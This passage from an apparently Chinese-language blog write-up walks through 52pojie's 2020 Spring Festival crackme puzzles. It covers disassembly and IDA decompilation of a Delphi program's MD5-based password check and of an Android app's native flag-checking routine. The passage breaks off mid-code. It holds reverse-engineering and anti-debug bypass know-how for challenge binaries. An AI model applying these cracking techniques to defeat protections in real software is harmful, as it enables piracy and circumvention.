dumped_.00617DCB00617D83   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617D86   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617D89   .  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617D8C   .  E8 2B1FDFFF   CALL dumped_.00409CBC00617D91   .  8D4D EC       LEA ECX,DWORD PTR SS:[EBP-0x14]00617D94   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617D9A   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617D9C   .  8D45 F8       LEA EAX,DWORD PTR SS:[EBP-0x8]00617D9F   .  E8 7C7CE1FF   CALL dumped_.0042FA2000617DA4   .  8B45 EC       MOV EAX,DWORD PTR SS:[EBP-0x14]00617DA7   .  BA 087F6100   MOV EDX,dumped_.00617F08          ;  ea6b2efbdd4255a9f1b3bbc6399b58f400617DAC   .  E8 472DDFFF   CALL dumped_.0040AAF800617DB1   .  0F9445 E6     SETE BYTE PTR SS:[EBP-0x1A]00617DB5   .  33C0          XOR EAX,EAX00617DB7   .  5A            POP EDX00617DB8   .  59            POP ECX00617DB9   .  59            POP ECX00617DBA   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617DBD   .  68 D67D6100   PUSH dumped_.00617DD600617DC2   &gt;  8D45 EC       LEA EAX,DWORD PTR SS:[EBP-0x14]00617DC5   .  E8 F21EDFFF   CALL dumped_.00409CBC00617DCA   .  C3            RETN00617DCB   .- E9 0815DFFF   JMP dumped_.004092D800617DD0   .^ EB F0         JMP SHORT dumped_.00617DC200617DD2   &gt;  C645 E6 00    MOV BYTE PTR SS:[EBP-0x1A],0x000617DD6   .  807D E6 00    CMP BYTE PTR SS:[EBP-0x1A],0x000617DDA   .  74 6D         JE SHORT dumped_.00617E4900617DDC   .  33C0          XOR EAX,EAX00617DDE   .  55            PUSH EBP00617DDF   .  68 2C7E6100   PUSH dumped_.00617E2C00617DE4   .  64:FF30       PUSH DWORD PTR FS:[EAX]00617DE7   .  64:8920       MOV DWORD PTR FS:[EAX],ESP00617DEA   .  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617DED   .  E8 CA1EDFFF   CALL dumped_.00409CBC00617DF2   .  8D4D E8       LEA ECX,DWORD PTR SS:[EBP-0x18]00617DF5   .  8B15 04786200 MOV EDX,DWORD PTR DS:[0x627804]   ;  dumped_.0062B6AC00617DFB   .  8B12          MOV EDX,DWORD PTR DS:[EDX]00617DFD   .  8D45 F4       LEA EAX,DWORD PTR SS:[EBP-0xC]00617E00   .  E8 1B7CE1FF   CALL dumped_.0042FA2000617E05   .  8B45 E8       MOV EAX,DWORD PTR SS:[EBP-0x18]00617E08   .  BA 587F6100   MOV EDX,dumped_.00617F58          ;  c8d46d341bea4fd5bff866a65ff8aea900617E0D   .  E8 E62CDFFF   CALL dumped_.0040AAF800617E12   .  0F9445 E5     SETE BYTE PTR SS:[EBP-0x1B]00617E16   .  33C0          XOR EAX,EAX00617E18   .  5A            POP EDX00617E19   .  59            POP ECX00617E1A   .  59            POP ECX00617E1B   .  64:8910       MOV DWORD PTR FS:[EAX],EDX00617E1E   .  68 337E6100   PUSH dumped_.00617E3300617E23   &gt;  8D45 E8       LEA EAX,DWORD PTR SS:[EBP-0x18]00617E26   .  E8 911EDFFF   CALL dumped_.00409CBC00617E2B   .  C3            RETN00617E2C   .- E9 A714DFFF   JMP dumped_.004092D800617E31   .^ EB F0         JMP SHORT dumped_.00617E2300617E33   .  807D E5 00    CMP BYTE PTR SS:[EBP-0x1B],0x000617E37   .  74 10         JE SHORT dumped_.00617E4900617E39   .  83C9 FF       OR ECX,-0x100617E3C   .  83CA FF       OR EDX,-0x100617E3F   .  B8 A87F6100   MOV EAX,dumped_.00617FA8          ;  请把答案回复到论坛公众号！00617E44   .  E8 236BF5FF   CALL dumped_.0056E96C</code></pre><p>抛弃 OD，把 dump 下来的程序导入 IDA，根据前面找到的 unicode 字符串定位到函数，反编译后得到如下代码：</p><pre><code class="cpp">int __fastcall TForm1_edtPwdChange(int a1){  int v1; // ebx  int v2; // edx  int len; // eax  int md5Handler; // esi  char v5; // zf  unsigned int v7; // [esp-18h] [ebp-58h]  int *v8; // [esp-14h] [ebp-54h]  char *v9; // [esp-10h] [ebp-50h]  unsigned int v10; // [esp-Ch] [ebp-4Ch]  void *v11; // [esp-8h] [ebp-48h]  int *v12; // [esp-4h] [ebp-44h]  int v13; // [esp+8h] [ebp-38h]  int v14; // [esp+Ch] [ebp-34h]  int v15; // [esp+10h] [ebp-30h]  int v16; // [esp+14h] [ebp-2Ch]  int v17; // [esp+18h] [ebp-28h]  int v18; // [esp+1Ch] [ebp-24h]  int v19; // [esp+20h] [ebp-20h]  char v20; // [esp+25h] [ebp-1Bh]  char v21; // [esp+26h] [ebp-1Ah]  char v22; // [esp+27h] [ebp-19h]  char *string3; // [esp+28h] [ebp-18h]  char *string2; // [esp+2Ch] [ebp-14h]  char *string1; // [esp+30h] [ebp-10h]  char s3; // [esp+34h] [ebp-Ch]  char s2; // [esp+38h] [ebp-8h]  char s1; // [esp+3Ch] [ebp-4h]  int savedregs; // [esp+40h] [ebp+0h]  v1 = a1;  v12 = &amp;savedregs;  v11 = &amp;loc_617E9C;  v10 = __readfsdword(0);  __writefsdword(0, (unsigned int)&amp;v10);  sub_541DB8(*(Controls::TControl **)(a1 + 976), &amp;v19);  len = v19;  if ( v19 )    len = *(_DWORD *)(v19 - 4);  if ( len == 15 )                              // input&#39;s length should be 15  {    LOBYTE(v2) = 1;    md5Handler = sub_616B84(&amp;cls_IdHashMessageDigest_TIdHashMessageDigest5, v2);// get MD5 handler    v9 = &amp;s1;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v17);    sub_50F2EC(v17, 7, &amp;v18);    registerFunc(md5Handler, v18, 0, (int)&amp;s1);    v9 = &amp;s2;    v8 = &amp;v16;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v15);    Compprod::TComponentsPageProducer::HandleTag(&amp;v16);    registerFunc(md5Handler, v16, 0, (int)&amp;s2);    v9 = &amp;s3;    sub_541DB8(*(Controls::TControl **)(v1 + 976), &amp;v13);    unknown_libname_807(v13, 4, &amp;v14);    registerFunc(md5Handler, v14, 0, (int)&amp;s3);    v9 = (char *)&amp;savedregs;    v8 = (int *)&amp;loc_617D6E;    v7 = __readfsdword(0);    __writefsdword(0, (unsigned int)&amp;v7);    freeMem(&amp;string1);    sub_42FAA0((int *)&amp;s1, 0, (int *)&amp;string1);    compareStr(string1, (char *)L&quot;E7EE5F4653E31955CACC7CD68E2A7839&quot;);// compare string1    v22 = v5;    __writefsdword(0, v7);    v9 = (char *)&amp;loc_617D75;    freeMem(&amp;string1);    if ( v22 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617DCB;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string2);      sub_42FA20(&amp;s2, 0, &amp;string2);      compareStr(string2, (char *)L&quot;ea6b2efbdd4255a9f1b3bbc6399b58f4&quot;);// compare string2      v21 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617DD6;      freeMem(&amp;string2);    }    else    {      v21 = 0;    }    if ( v21 )    {      v9 = (char *)&amp;savedregs;      v8 = (int *)&amp;loc_617E2C;      v7 = __readfsdword(0);      __writefsdword(0, (unsigned int)&amp;v7);      freeMem(&amp;string3);      sub_42FA20(&amp;s3, 0, &amp;string3);      compareStr(string3, (char *)L&quot;c8d46d341bea4fd5bff866a65ff8aea9&quot;);// compare string3      v20 = v5;      __writefsdword(0, v7);      v9 = (char *)&amp;loc_617E33;      freeMem(&amp;string3);      if ( v20 )                                // Success        createDialog((int)L&quot;请把答案回复到论坛公众号！&quot;, -1, -1);    }  }  __writefsdword(0, v10);  v12 = (int *)&amp;loc_617EA3;  freeMem(&amp;v13);  freeMem(&amp;v14);  freeMem(&amp;v15);  freeMem(&amp;v16);  freeMem(&amp;v17);  freeMem(&amp;v18);  freeMem(&amp;v19);  return sub_409D1C(&amp;string3, 6);}</code></pre><p>反编译后的代码也比较含糊，但可以猜到，输入的字符串长度为 15，字符串被分成了 3 部分，每部分分别进行 MD5 哈希，并与内存中的字符串进行比较，字符串正确就会弹出一个正确的对话窗口。MD5 在理论上是不可逆的，但可以在通过搜索引擎查找网上已经被爆破出的对应的明文。第一部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/4.png" srcset="/img/loading.gif" alt></p><p>第二部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/5.png" srcset="/img/loading.gif" alt></p><p>第三部分的解密结果：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/6.png" srcset="/img/loading.gif" alt></p><p>将得到的字符串拼接并进行验证：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/7.png" srcset="/img/loading.gif" alt></p><p>回复公众号得到口令</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/8.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这题给的是一个 apk，先使用 jdax 打开，查看程序入口点 MainActivity，得到如下代码：</p><pre><code class="java">package com.wuaipojie.crackme01;import android.os.Bundle;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity implements OnClickListener {    private Button btn_click;    private EditText editText;    private native boolean checkFlag(String str);    public native void onClick(View view);    static {        /* JADX: method processing error *//*Error: java.lang.NullPointerException    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.searchTryCatchDominators(ProcessTryCatchRegions.java:75)    at jadx.core.dex.visitors.regions.ProcessTryCatchRegions.process(ProcessTryCatchRegions.java:45)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.postProcessRegions(RegionMakerVisitor.java:63)    at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:58)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)    at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)    at jadx.core.ProcessClass.process(ProcessClass.java:37)    at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:280)    at jadx.api.JavaClass.decompile(JavaClass.java:62)*/        /*        r0 = &quot;crack_j2c&quot;;     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }        java.lang.System.loadLibrary(r0);     Catch:{ UnsatisfiedLinkError -&gt; 0x0005 }    L_0x0005:        return;        */        throw new UnsupportedOperationException(&quot;Method not decompiled: com.wuaipojie.crackme01.MainActivity.&lt;clinit&gt;():void&quot;);    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.editText = (EditText) findViewById(R.id.input_flag);        Button button = (Button) findViewById(R.id.button);        this.btn_click = button;        button.setOnClickListener(this);    }}</code></pre><p>主要有三个函数，<code>onCreate()</code> 在 Java 层中实现，可以看出整个界面中有一个文本框和一个按钮，并设置了一个按钮的监听事件，即 onClick；<code>onClick()</code> 和 <code>checkFlag()</code> 可以看到是在 Native 层进行实现的，可以从 lib 文件夹中找到 so 文件，接下来用 IDA 对 so 中的两个函数进行分析。导入 IDA 后，通过函数名可以看出两个函数通过静态注册：</p><p><img src="/pics/2020春节-吾爱破解解题领红包活动/9.png" srcset="/img/loading.gif" alt></p><p>然后先来看 onClick 函数。这边略过一些导入 jni.h 等一些分析的过程（一般静态注册函数的第一个参数是 JNIEnv 等等），在分析的过程中大致猜测出两个函数 <code>sub_5288</code> 和 <code>sub_539C</code> 两个函数分别用来获取指定的方法（getMethod）或者是域（getField）。接下来直接来看分析过后的代码：</p><pre><code class="cpp">int __fastcall Java_com_wuaipojie_crackme01_MainActivity_onClick__Landroid_view_View_2(_JNIEnv *env, int a2, int a3){  _JNIEnv *env_; // r4  int v4; // r5  int v5; // r9  int v6; // r0  int v7; // r5  jstring (__cdecl *v8)(JNIEnv *, const char *); // r2  int v9; // r6  int v10; // r8  int v11; // r6  int v12; // r8  int len; // r5  int v14; // r5  const char *v15; // r1  int v16; // r6  int v17; // r5  int result; // r0  JNINativeMethod method; // [sp+4h] [bp-74h]  int v20; // [sp+10h] [bp-68h]  int v21; // [sp+14h] [bp-64h]  int v22; // [sp+18h] [bp-60h]  int v23; // [sp+1Ch] [bp-5Ch]  int v24; // [sp+20h] [bp-58h]  int v25; // [sp+24h] [bp-54h]  int a3a; // [sp+28h] [bp-50h]  int v27; // [sp+2Ch] [bp-4Ch]  int v28; // [sp+30h] [bp-48h]  int v29; // [sp+34h] [bp-44h]  int v30; // [sp+38h] [bp-40h]  int a2a; // [sp+3Ch] [bp-3Ch]  int v32; // [sp+40h] [bp-38h]  int v33; // [sp+48h] [bp-30h]  int v34; // [sp+50h] [bp-28h]  int v35; // [sp+58h] [bp-20h]  env_ = env;  v4 = a3;  a2a = 0;  v29 = 0;  v30 = 0;  v27 = 0;  v28 = 0;  v25 = 0;  a3a = 0;  v23 = 0;  v24 = 0;  v21 = 0;  v22 = 0;  method.fnPtr = 0;  v20 = 0;  v5 = ((int (__fastcall *)(_JNIEnv *, int))env-&gt;functions-&gt;NewLocalRef)(env, a2);  v6 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;NewLocalRef)(env_, v4);  if ( !v5 )    goto LABEL_38;  v7 = v6;  method.name = &quot;editText&quot;;  method.signature = &quot;Landroid/widget/EditText;&quot;;  if ( getFields(env_, &amp;a2a, &amp;a3a, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )    goto LABEL_39;  v9 = ((int (__fastcall *)(_JNIEnv *, int, int))env_-&gt;functions-&gt;GetObjectField)(env_, v5, a3a);  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( v7 )    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v7);  if ( !v9 )    goto LABEL_38;  if ( !v25 )  {    method.name = &quot;getText&quot;;    method.signature = &quot;()Landroid/text/Editable;&quot;;    if ( getMethods(env_, &amp;v30, &amp;v25, 0, &quot;android/widget/EditText&quot;, method) )      goto LABEL_39;  }  v10 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v9);// get input string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v9);  if ( !v10 )    goto LABEL_38;  if ( !v24 )  {    method.name = &quot;toString&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v29, &amp;v24, 0, &quot;java/lang/Object&quot;, method) )      goto LABEL_39;  }  v11 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v10);// convert object to string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v10);  if ( !v11 )    goto LABEL_38;  if ( !v23 )  {    method.name = &quot;trim&quot;;    method.signature = &quot;()Ljava/lang/String;&quot;;    if ( getMethods(env_, &amp;v28, &amp;v23, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  v12 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v11);// trim string  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v11);  if ( !v12 )    goto LABEL_38;  if ( !v22 )  {    method.name = &quot;length&quot;;    method.signature = &quot;()I&quot;;    if ( getMethods(env_, &amp;v28, &amp;v22, 0, &quot;java/lang/String&quot;, method) )      goto LABEL_39;  }  len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallIntMethodA)(env_, v12);// get string&#39;s length  if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    goto LABEL_39;  if ( len == 30 )                              // len(flag) == 30  {    if ( !v21 )    {      method.name = &quot;checkFlag&quot;;      method.signature = &quot;(Ljava/lang/String;)Z&quot;;      if ( getMethods(env_, &amp;a2a, &amp;v21, 0, &quot;com/wuaipojie/crackme01/MainActivity&quot;, method) )        goto LABEL_39;    }    v32 = v12;    v14 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallBooleanMethodA)(env_, v5);// invoke checkFlag method    if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      goto LABEL_39;    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v8 = env_-&gt;functions-&gt;NewStringUTF;    if ( !v14 )      goto LABEL_40;    v15 = &quot;正确！！！回复你输入的内容到吾爱破解论坛公众号&quot;;            // correct  }  else  {    ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v12);    v15 = &quot;flag长度必须为30位&quot;;                       // flag&#39;s length must equal to 30    v8 = env_-&gt;functions-&gt;NewStringUTF;  }  while ( 1 )  {    v16 = ((int (__fastcall *)(_JNIEnv *, const char *))v8)(env_, v15);    if ( v20      || (method.name = &quot;makeText&quot;,          method.signature = &quot;(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;&quot;,          !getMethods(env_, &amp;v27, &amp;v20, 1, &quot;android/widget/Toast&quot;, method)) )    {      v33 = v16;      v32 = v5;      v34 = 0;      v17 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v27);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        if ( v16 )          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v16);        if ( v17 )        {          if ( method.fnPtr            || (method.name = &quot;show&quot;,                method.signature = &quot;()V&quot;,                !getMethods(env_, &amp;v27, (int *)&amp;method.fnPtr, 0, &quot;android/widget/Toast&quot;, method)) )          {            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallVoidMethodA)(env_, v17);            ((void (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_);          }        }        else        {LABEL_38:          sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);        }      }    }LABEL_39:    result = _stack_chk_guard - v35;    if ( _stack_chk_guard == v35 )      break;LABEL_40:    v15 = &quot;验证错误，继续加油&quot;;                          // wrong  }  return result;}</code></pre><p>onClick 函数中的内容主要为在点击按钮后获取输入内容，并判断输入的字符串长度是否为 30，然后调用 checkFlag 函数对字符串进行判断。接下来再看看 checkFlag 函数，这个函数比较长，分成几段来看。首先调用了 <code>isDebuggerConnected()</code> 函数，猜测应该是用来反调试：</p><pre><code class="cpp">  method1.name = &quot;isDebuggerConnected&quot;;  method1.signature = &quot;()Z&quot;;  if ( !getMethods(env_, &amp;jclass, &amp;jmethodid, 1, &quot;android/os/Debug&quot;, method1) )// anti-debug??  {    t1 = (unsigned int)&amp;t_;    v8 = ((int (__fastcall *)(_JNIEnv *, int, int, int *))env_-&gt;functions-&gt;CallStaticBooleanMethodA)(           env_,           jclass,           jmethodid,           &amp;t_);    if ( !(((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) | v8) )    {      key1 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 9);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        goto LABEL_7;    }    goto LABEL_4;  }</code></pre><p>接下来将一串字符串分成三部分（key1 = “thisiskey”，key2 = “52pojie_2020_happy_chinese_new_year”，key3 = “20200125”）并分给了三个变量：</p><pre><code class="cpp">    v6 = 0;    ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, const char *))env_-&gt;functions-&gt;SetByteArrayRegion)(      env_,      key1,      0,      9,      &quot;thisiskey52pojie_2020_happy_chinese_new_year20200125&quot;);// key1 = &quot;thisiskey&quot;    key2 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);    if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )    {      v6 = 0;      ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(        env_,        key2,        0,        35,        &quot;52pojie_2020_happy_chinese_new_year20200125&quot;);// key2 = &quot;52pojie_2020_happy_chinese_new_year&quot;      key3 = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 8);      if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )      {        v6 = 0;        ((void (__fastcall *)(_JNIEnv *, int, _DWORD, signed int, char *))env_-&gt;functions-&gt;SetByteArrayRegion)(          env_,          key3,          0,          8,          &quot;20200125&quot;);                          // key3 = &quot;20200125&quot;</code></pre><p>然后新建了一个 35 位的 Byte 数组，做一个循环，当 i 不为 0 且 i 是 4 的倍数时，下标设置为 <code>(i &gt;&gt; 2) - 1</code>，取 key3 中的值来 append 到数组中；反之，下标设置为 i，取 key2 中的值来 append 到数组中：</p><pre><code class="cpp">        arr = ((int (__fastcall *)(_JNIEnv *, signed int))env_-&gt;functions-&gt;NewByteArray)(env_, 35);        if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )        {          i = 0;          arr_ = arr;          key1_ = key1;          do          {            if ( !i || i &amp; 3 )            {              if ( !key2 )                goto LABEL_41;              pointer = key2;              i_ = i;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;            }            else                                // if i != 0 and i % 4 == 0            {              pointer = key3;              if ( !key3 )                goto LABEL_41;              GetByteArrayRegion_ = env_-&gt;functions-&gt;GetByteArrayRegion;              i_ = (i &gt;&gt; 2) - 1;                // 0,1,2,3,4,5,6,7            }            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, unsigned int))GetByteArrayRegion_)(              env_,              pointer,              i_,              1,              t1);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;            if ( !arr_ )            {LABEL_41:              sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);              goto LABEL_4;            }            LOBYTE(t_) = key1;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, unsigned int))env_-&gt;functions-&gt;SetByteArrayRegion)(              env_,              arr_,              i,              1,              t1);            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_4;          }          while ( i++ &lt; 0x22 );                 // for i in range(35)</code></pre><p>接下来对 byte 数组进行 MD5 哈希，然后取摘要生成 16 位的 byte 数组：</p><pre><code class="cpp">          md5Str = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;MD5&quot;);          if ( !v47 )          {            method2.name = &quot;getInstance&quot;;            method2.signature = &quot;(Ljava/lang/String;)Ljava/security/MessageDigest;&quot;;            if ( getMethods(env_, &amp;v52, &amp;v47, 1, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = md5Str;          v18 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v52);// md5 function          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( md5Str )            ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, md5Str);          if ( !v18 )          {LABEL_87:            sub_4EC0(env_, &quot;java/lang/NullPointerException&quot;, &quot;NullPointerException&quot;);            goto LABEL_88;          }          if ( !v46 )          {            method2.name = &quot;digest&quot;;            method2.signature = &quot;([B)[B&quot;;            if ( getMethods(env_, &amp;v52, &amp;v46, 0, &quot;java/security/MessageDigest&quot;, method2) )              goto LABEL_88;          }          t_ = arr_;          md5Digest = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v18);// get hash digest          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v18);          if ( !md5Digest )            goto LABEL_87;</code></pre><p>然后做一个循环，对数组中的元素和 key1 进行逐位异或：</p><pre><code class="cpp">          len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          idx = 0;          while ( 1 )                           // for i in range(16)          {            t1 = 0x38E38E39 * (unsigned __int64)(unsigned int)idx &gt;&gt; 32;// div 9? useless            if ( idx &gt;= len )              break;            ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              md5Digest,              idx,              1,              &amp;t_);            key1 = (unsigned __int8)t_;            if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              goto LABEL_88;            if ( !key1_ )              goto LABEL_87;            ((void (__fastcall *)(_JNIEnv *, int, unsigned int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(              env_,              key1_,              idx % 9u,                         // mod 9              1,              &amp;t_);            ch = t_;            if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            {              LOBYTE(t_) = ch ^ key1;           // xor              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;SetByteArrayRegion)(                env_,                md5Digest,                idx,                1,                &amp;t_);              if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )              {                len = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);                ++idx;                if ( !((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  continue;              }            }            goto LABEL_88;          }</code></pre><p>接下来，将得到的 byte 数组逐位转成 hex 字符串，如果小于 0xF，即只有一位，高位补 0。将结果逐位 append 到一个新的字符串中，得到一个 32 位的字符串：</p><pre><code class="cpp">          len__ = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;GetArrayLength)(env_, md5Digest);          if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )            goto LABEL_88;          if ( len__ &gt;= 1 )          {            j = 0;            classInteger = &quot;java/lang/Integer&quot;;            toHexString_ = &quot;toHexString&quot;;            method2.fnPtr = &quot;(I)Ljava/lang/String;&quot;;            zeroPad = 0;            while ( 1 )            {              ((void (__fastcall *)(_JNIEnv *, int, int, signed int, int *))env_-&gt;functions-&gt;GetByteArrayRegion)(                env_,                md5Digest,                j,                1,                &amp;t_);              t1 = (unsigned __int8)t_;              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( t1 &lt;= 0xF )                  // if x &lt; 0xF then append a zero              {                if ( zeroPad )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, zeroPad);                zeroPad = ((int (__fastcall *)(_JNIEnv *, const char *))env_-&gt;functions-&gt;NewStringUTF)(env_, &quot;0&quot;);                if ( !v44 )                {                  method2.name = &quot;append&quot;;                  method2.signature = &quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;;                  if ( getMethods(env_, &amp;v51, &amp;v44, 0, &quot;java/lang/StringBuilder&quot;, method2) )                    break;                }                t_ = zeroPad;                v24 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallObjectMethodA)(env_, v22);// append zero                if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                  break;                if ( v24 )                  ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, v24);              }              if ( !v43 )              {                *(_QWORD *)&amp;method2.name = __PAIR__((unsigned int)method2.fnPtr, (unsigned int)toHexString_);                if ( getMethods(env_, &amp;v50, &amp;v43, 1, classInteger, method2) )// get toHexString method                  break;              }              t_ = t1;              t1 = ((int (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;CallStaticObjectMethodA)(env_, v50);              if ( ((int (__fastcall *)(_JNIEnv *))env_-&gt;functions-&gt;ExceptionCheck)(env_) )                break;              if ( arr_ )                ((void (__fastcall *)(_JNIEnv *, int))env_-&gt;functions-&gt;DeleteLocalRef)(env_, arr_);              if ( !v44 )              {                method2.name = &quot;append&quot;;                method2.signature = 